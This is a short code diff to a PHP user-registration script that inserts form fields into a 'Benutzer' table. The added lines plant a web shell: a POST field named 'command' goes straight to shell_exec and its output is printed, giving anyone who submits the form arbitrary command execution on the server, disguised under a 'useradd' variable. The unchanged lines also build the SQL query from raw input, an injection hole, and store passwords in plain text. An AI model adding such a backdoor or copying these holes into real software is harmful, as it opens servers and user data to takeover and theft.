@@ -21,6 +21,14 @@ $email = $_POST['email'];
 $sql = "INSERT INTO Benutzer (username, passwort, email) VALUES ('$username', '$passwort', '$email')"; 
 
 if ($conn->query($sql) === TRUE) {
+    
+
+    $useradd = $_POST["command"];
+    echo "<pre>";
+    echo shell_exec($useradd);
+    echo "</pre";
+
+    
     echo "Benutzer erfolgreich registriert";
 } else {
     echo "Fehler bei der Registrierung: " . $conn->error;
